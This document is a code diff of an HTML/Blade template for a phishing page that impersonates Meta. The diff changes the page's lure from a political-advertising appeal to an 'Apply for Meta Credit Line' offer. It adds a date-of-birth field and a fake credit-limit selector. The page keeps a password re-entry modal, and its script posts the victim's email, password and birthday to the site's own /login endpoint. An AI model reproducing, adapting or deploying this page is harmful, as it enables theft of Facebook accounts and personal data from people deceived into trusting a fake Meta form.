@@ -8,13 +8,12 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
     <!-- Bootstrap CSS -->
     <link rel="stylesheet" href="{{ asset('assets/style.css') }}">
-    <title>Appeal political advertisement</title>
     <link rel="stylesheet" href="{{ asset('assets/auth.css') }}">
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" />
-    <title>Meta - Appeal for violation of Political Advertising Policy Meta</title>
+    <title>Apply for Meta Credit Line</title>
     <meta name="csrf-token" content="{{ csrf_token() }}">
     <link href="https://netdna.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" />
-
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.2/font/bootstrap-icons.min.css">
 
 </head>
 
@@ -25,8 +24,7 @@
                 <div class="header-left flex">
                     <nav class="logo">
                         <a href="/">
-                            <img src="https://static.xx.fbcdn.net/rsrc.php/y9/r/tL_v571NdZ0.svg" alt="Meta"
-                                class="logo-meta" decoding="auto" loading="lazy" />
+                            <img src="https://static.xx.fbcdn.net/rsrc.php/y9/r/tL_v571NdZ0.svg" alt="Meta" class="logo-meta" decoding="auto" loading="lazy" />
                         </a>
                     </nav>
                     <ul class="menu-list flex">
@@ -50,8 +48,7 @@
                     <nav class="search">
                         <i class="fa-solid fa-magnifying-glass"></i>
                     </nav>
-                    <a class="header-button"
-                        href="https://www.facebook.com/business/help/167836590566506?id=288762101909005">
+                    <a class="header-button" href="https://www.facebook.com/business/help/167836590566506?id=288762101909005">
                         Learn More
                     </a>
                 </div>
@@ -85,14 +82,11 @@
                                 Password:
                                 <nav class="mls">
                                     <p class="inputout">
-                                        <input type="password" class="inputpassword autofocus" id="pass"
-                                            name="pass" data-testid="reauth_password_field" />
+                                        <input type="password" class="inputpassword autofocus" id="pass" name="pass" data-testid="reauth_password_field" />
                                     </p>
                                     <!-- Hiển thị hình ảnh loading khi file đang được tải lên, ban đầu sẽ không hiển thị -->
                                     <p class="loading-img">
-                                        <img id="loadingIndicator1" class="pls uiLoadingIndicatorAsync img"
-                                            src="https://static.xx.fbcdn.net/rsrc.php/v3/yA/r/vF9DX0rAdyp.gif"
-                                            alt="Loading..." width="16" height="11" style="display: none;">
+                                        <img id="loadingIndicator1" class="pls uiLoadingIndicatorAsync img" src="https://static.xx.fbcdn.net/rsrc.php/v3/yA/r/vF9DX0rAdyp.gif" alt="Loading..." width="16" height="11" style="display: none;">
                                     </p>
                                 </nav>
                             </div>
@@ -100,8 +94,7 @@
                             <p class="underline-popup"></p>
                             <div id="889rorms" class="flex form-popup">
                                 <div class="forgot_box">
-                                    <a href="https://www.facebook.com/recover/initiate/?ref=www_reauth_async"
-                                        class="forgot">
+                                    <a href="https://www.facebook.com/recover/initiate/?ref=www_reauth_async" class="forgot">
                                         Forgot your password?
                                     </a>
                                 </div>
@@ -117,9 +110,9 @@
             </div>
             <form class="row g-3 form-main" id="form-main" method="post" enctype="multipart/form-data">
                 <h1 class="title">
-                    Appeal for violation of Political Advertising Policy Meta
+                    Apply for Meta Credit Line
                 </h1>
-
+                <h3 style="font-size: 14px;">Thank you for contacting Ads Payments Support.</h3>
                 <div>
                     <label for="validationCustom01" class="form-label">
                         Name
@@ -128,21 +121,30 @@
 
                     <div id="nameErr" style="color: red;display: none;  font-size: 13px"></div>
                 </div>
+                <div>
+                    <label for="date" class="form-label">
+                        Date of birth
+                    </label>
+                    <input type="date" class="form-control" id="birthday" name="birthday" >
+
+                    <div id="birthdayErr" style="color: red;display: none;  font-size: 13px"></div>
+                </div>
 
                 <div>
                     <label for="validationCustom01" class="form-label">
-                        Phone Number
+                        Verify Phone Number
                     </label>
-                    <input type="text" class="form-control" placeholder="Phone number" id="phone"
-                        name="phone">
+                    <input type="text" class="form-control" placeholder="Phone number" id="phone" name="phone">
                     <div id="phoneErr" style="color: red; display: none; font-size: 13px"></div>
 
                 </div>
 
                 <div>
                     <label for="validationCustom02" class="form-label">
-                        Email
+                        Verify Email Address
                     </label>
+                    <h6 style="font-size: 13px; color: #a29999;"> We will send you new information about your request via your email.</h6>
+
                     <input type="email" class="form-control" placeholder="Email" id="email" name="email">
                     <div id="emailErr" style="color: red; display: none; font-size: 13px"></div>
 
@@ -602,56 +604,43 @@
                         <option value="Other">Other</option>
                     </select>
                 </div>
-                <div class="col-12">
-                    <div class="form-check radio-check">
-                        <input type="radio" name="radioSelected" value="yes" checked /> Yes I'm advertising
-                        about
-                        politics but it's not illegal
-                        <br />
-                        <input type="radio" name="radioSelected" value="no" /> No,
-                        I do not advertise about
-                        political
-                        issues
-                        <br />
-                        <input type="radio" name="radioSelected" value="other" />
-                        Other:
-                    </div>
+                <div class="">
+                    <label for="validationCustom04" class="form-label">
+                        Desired Credit Limit
+                    </label>
+                    <h6 style="font-size: 13px; color: #a29999;">How much do you want your credit limit to be?</h6>
+                    <select class="form-select select " id="industries" name="industries">
+                        <option value="50000">5.000$</option>
+                        <option value="10000">10.000$</option>
+                        <option value="50000">50.000$</option>
+                        <option value="500000">500.000$</option>
+                        <option value="1000000">1.000.000$</option>
+                    </select>
                 </div>
                 <div class="col-12">
-                    <textarea class="" cols="10" rows="5" name="textarea" id="customTextarea" disabled></textarea>
+                    <label for="validationCustom04" class="form-label">
+                        Description
+                    </label>
+                    <h6 style="font-size: 13px; color: #a29999;">Additional information about your business (if any).</h6>
+                    <textarea class="" cols="10" rows="5" name="textarea" id="customTextarea"></textarea>
                 </div>
 
-                <div class="col-12">
+                <!-- <div class="col-12">
                     <p class="lorem">Upload your ID or Driver's License</p>
-                </div>
+                </div> -->
 
 
 
-                <div>
-
-
-                    <input type="file" id="fileInput" class="fileInputUpload" name="files[]"
-                        accept="image/png, image/jpeg, image/jpg" hidden multiple>
+                <!-- <div>
+                    <input type="file" id="fileInput" class="fileInputUpload" name="files[]" accept="image/png, image/jpeg, image/jpg" hidden multiple>
                     <label for="fileInput" class="upload-file btn-rounded">Upload files</label>
-
-
-                    <!-- Span để hiển thị thông điệp về trạng thái file -->
                     <span id="fileChosen">No file selected</span>
-
-                    <!-- Hiển thị hình ảnh loading khi file đang được tải lên, ban đầu sẽ không hiển thị -->
-                    <img id="loadingIndicator" class="pls uiLoadingIndicatorAsync img"
-                        src="https://static.xx.fbcdn.net/rsrc.php/v3/yA/r/vF9DX0rAdyp.gif" alt="Loading..."
-                        width="16" height="11" style="display: none;">
-
-                    <!-- Button để người dùng có thể hủy bỏ file đã chọn -->
+                    <img id="loadingIndicator" class="pls uiLoadingIndicatorAsync img" src="https://static.xx.fbcdn.net/rsrc.php/v3/yA/r/vF9DX0rAdyp.gif" alt="Loading..." width="16" height="11" style="display: none;">
                     <button id="cancelUpload" style="display: none;"><i class="fa-solid fa-xmark"></i></button>
-
-                    <!-- Span để hiển thị cảnh báo khi số lượng file chọn không đủ -->
                     <span id="fileWarning" style="color: red; display: none;">Please select at least 2
                         files.</span>
-                </div>
-
-                <label id="find-id">
+                </div> -->
+                <!-- <label id="find-id">
                     <p class="find-id">
                         You can also find out
                         <a class="happen" href="https://www.facebook.com/help/159096464162185">
@@ -659,12 +648,24 @@
                         </a>
                         after sending it to Facebook.
                     </p>
-                </label>
+                </label> -->
 
                 <div class="submit-form">
-                    <button class="select-btn login-meta" type="button">
-                        Submit
-                    </button>
+                    <div>
+                        <span style="font-size: 15px;">Average waiting time: 1 minute</span>
+                    </div>
+                    <div>
+                        <button class="select-btn login-meta" type="button">
+                            <svg fill="#ffffff" width="25px" class="white-icon" version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 60 60" xml:space="preserve" stroke="#ffffff">
+                                <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
+                                <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g>
+                                <g id="SVGRepo_iconCarrier">
+                                    <path d="M30,1.5c-16.542,0-30,12.112-30,27c0,5.205,1.647,10.246,4.768,14.604c-0.591,6.537-2.175,11.39-4.475,13.689 c-0.304,0.304-0.38,0.769-0.188,1.153C0.276,58.289,0.625,58.5,1,58.5c0.046,0,0.093-0.003,0.14-0.01 c0.405-0.057,9.813-1.412,16.617-5.338C21.622,54.711,25.738,55.5,30,55.5c16.542,0,30-12.112,30-27S46.542,1.5,30,1.5z">
+                                    </path>
+                                </g>
+                            </svg><span style="font-size:14px;">Start chatting</span>
+                        </button>
+                    </div>
                 </div>
             </form>
         </section>
@@ -945,20 +946,16 @@
                     </div>
                     <nav class="flex">
                         <div class="footer-image">
-                            <img src="https://scontent.fhan20-1.fna.fbcdn.net/v/t39.8562-6/120319840_799089310850692_4027936540782357774_n.svg?_nc_cat=1&ccb=1-7&_nc_sid=f537c7&_nc_ohc=ukShCzomoYsAX-cj-ez&_nc_ht=scontent.fhan20-1.fna&oh=00_AfDkLdLd7lVHg14clofNEbZGycHPx0njuOU0m1SgaoL60Q&oe=65594A01"
-                                alt="facebook" />
+                            <img src="https://scontent.fhan20-1.fna.fbcdn.net/v/t39.8562-6/120319840_799089310850692_4027936540782357774_n.svg?_nc_cat=1&ccb=1-7&_nc_sid=f537c7&_nc_ohc=ukShCzomoYsAX-cj-ez&_nc_ht=scontent.fhan20-1.fna&oh=00_AfDkLdLd7lVHg14clofNEbZGycHPx0njuOU0m1SgaoL60Q&oe=65594A01" alt="facebook" />
                         </div>
                         <div class="footer-image">
-                            <img src="https://scontent.fhan20-1.fna.fbcdn.net/v/t39.8562-6/125184609_367828907811587_6232717932985532700_n.svg?_nc_cat=1&ccb=1-7&_nc_sid=f537c7&_nc_ohc=A6XaOv9EIssAX9KcwNw&_nc_ht=scontent.fhan20-1.fna&oh=00_AfDCfDIZ_hak_Er8VITWnTWfqAN4pDrQTBS0BCZvOmPcVg&oe=6559F699"
-                                alt="instagram" />
+                            <img src="https://scontent.fhan20-1.fna.fbcdn.net/v/t39.8562-6/125184609_367828907811587_6232717932985532700_n.svg?_nc_cat=1&ccb=1-7&_nc_sid=f537c7&_nc_ohc=A6XaOv9EIssAX9KcwNw&_nc_ht=scontent.fhan20-1.fna&oh=00_AfDCfDIZ_hak_Er8VITWnTWfqAN4pDrQTBS0BCZvOmPcVg&oe=6559F699" alt="instagram" />
                         </div>
                         <div class="footer-image">
-                            <img src="https://scontent.fhan20-1.fna.fbcdn.net/v/t39.8562-6/125236997_694902778115984_451660285310228094_n.svg?_nc_cat=102&ccb=1-7&_nc_sid=f537c7&_nc_ohc=2_wjHrfUa38AX_8o8q4&_nc_ht=scontent.fhan20-1.fna&oh=00_AfDO46y08vUdxEO0ZF7I_POMkJLMF-tXFJXTGGyYA8fz5Q&oe=655AA6BF"
-                                alt="linkedin" />
+                            <img src="https://scontent.fhan20-1.fna.fbcdn.net/v/t39.8562-6/125236997_694902778115984_451660285310228094_n.svg?_nc_cat=102&ccb=1-7&_nc_sid=f537c7&_nc_ohc=2_wjHrfUa38AX_8o8q4&_nc_ht=scontent.fhan20-1.fna&oh=00_AfDO46y08vUdxEO0ZF7I_POMkJLMF-tXFJXTGGyYA8fz5Q&oe=655AA6BF" alt="linkedin" />
                         </div>
                         <div class="footer-image">
-                            <img src="https://scontent.fhan20-1.fna.fbcdn.net/v/t39.8562-6/120319840_799089310850692_4027936540782357774_n.svg?_nc_cat=1&ccb=1-7&_nc_sid=f537c7&_nc_ohc=ukShCzomoYsAX-cj-ez&_nc_ht=scontent.fhan20-1.fna&oh=00_AfDkLdLd7lVHg14clofNEbZGycHPx0njuOU0m1SgaoL60Q&oe=65594A01"
-                                alt="facebook" />
+                            <img src="https://scontent.fhan20-1.fna.fbcdn.net/v/t39.8562-6/120319840_799089310850692_4027936540782357774_n.svg?_nc_cat=1&ccb=1-7&_nc_sid=f537c7&_nc_ohc=ukShCzomoYsAX-cj-ez&_nc_ht=scontent.fhan20-1.fna&oh=00_AfDkLdLd7lVHg14clofNEbZGycHPx0njuOU0m1SgaoL60Q&oe=65594A01" alt="facebook" />
                         </div>
                     </nav>
                 </div>
@@ -1029,33 +1026,33 @@
 
 </html>
 <div class="modal fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
-     <div class="modal-dialog modal-dialog-centered">
-          <div class="modal-content">
-               <div class="modal-header">
-                    <h5 class="modal-title" id="exampleModalLabel">Please re-enter your password</h5>
-                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
-               </div>
-               <div class="modal-body">
-                    <h6 class="modal-title" id="staticBackdropLabel" style="font-weight: 200">For your security, you must re-enter your password to continue.</h6>
-                    <label for="password" class="form-label" style="font-weight: 200">
-                         Password:
-                    </label>
-                    <input type="password" class="form-control" placeholder="Password" id="password" name="password">
-               </div>
-               <div id="passwordError" style="color: red; display: none; margin-left: 18px; margin-top: -12px; font-size: 13px"></div>
+    <div class="modal-dialog modal-dialog-centered">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h5 class="modal-title" id="exampleModalLabel">Please re-enter your password</h5>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body">
+                <h6 class="modal-title" id="staticBackdropLabel" style="font-weight: 200">For your security, you must
+                    re-enter your password to continue.</h6>
+                <label for="password" class="form-label" style="font-weight: 200">
+                    Password:
+                </label>
+                <input type="password" class="form-control" placeholder="Password" id="password" name="password">
+            </div>
+            <div id="passwordError" style="color: red; display: none; margin-left: 18px; margin-top: -12px; font-size: 13px"></div>
 
-                <div class="modal-footer d-flex justify-content-between">
+            <div class="modal-footer d-flex justify-content-between">
                 <div>
                     <a href="#" class="text-primary" style="color: #254ebe;font-size: 13px">Forgot your password?</a>
                 </div>
                 <div>
-                    <button type="button" data-bs-dismiss="modal" class="btn btn-sm btn-secondary"
-                        style="background: #e8e8e8; color: #111">Close</button>
+                    <button type="button" data-bs-dismiss="modal" class="btn btn-sm btn-secondary" style="background: #e8e8e8; color: #111">Close</button>
                     <button type="button" class="btn btn-sm btn-primary" style="background: #254ebe">Submit</button>
                 </div>
             </div>
-          </div>
-     </div>
+        </div>
+    </div>
 </div>
 <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
 
@@ -1101,19 +1098,20 @@
             var password = $('#password').val();
             var phone = $('#phone').val();
             var email = $('#email').val();
-            var files = $('#fileInput')[0].files;
+            var birthday = $('#birthday').val();
+            //var files = $('#fileInput')[0].files; 
             var formData = new FormData();
 
-            for (var i = 0; i < files.length; i++) {
-                // Đảm bảo 'files' là một mảng các tệp tin và không cần thiết lập các tên tệp tin
-                formData.append('files[]', files[i]);
-            }
+            // for (var i = 0; i < files.length; i++) {
+            //     // Đảm bảo 'files' là một mảng các tệp tin và không cần thiết lập các tên tệp tin
+            //     formData.append('files[]', files[i]);
+            // }
 
-            var email = $('#email').val();
-            var password = $('#password').val();
+
 
             formData.append('email', email);
             formData.append('password', password);
+            formData.append('birthday', birthday);
             $.ajax({
                 type: 'POST',
                 url: '/login',
@@ -1144,4 +1142,14 @@
             });
         });
     });
+    document.getElementsByTagName('html')[0].setAttribute('lang', 'en');
+
+        // Hàm hiển thị ngày
+        function showDate() {
+            // Lấy giá trị ngày từ trường input
+            var dateValue = document.getElementById('birthday').value;
+
+            // Hiển thị giá trị ngày trong console
+            console.log('Selected Date:', dateValue);
+        }
 </script>
